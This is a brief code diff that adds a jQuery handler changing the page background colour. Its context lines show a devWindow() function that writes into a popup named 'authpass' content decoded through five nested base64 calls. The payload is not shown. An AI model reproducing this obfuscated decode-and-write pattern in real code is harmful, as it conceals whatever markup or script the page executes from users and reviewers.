@@ -3,3 +3,6 @@ function devWindow() {
     var authpass = window.open("", "", "width=400,height=400");
     authpass.document.write(atob(atob(atob(atob(atob(content))))));
 }
+jQuery('#colorinput').on('change', function() {
+    document.body.style.backgroundColor = jQuery(this).val();
+});
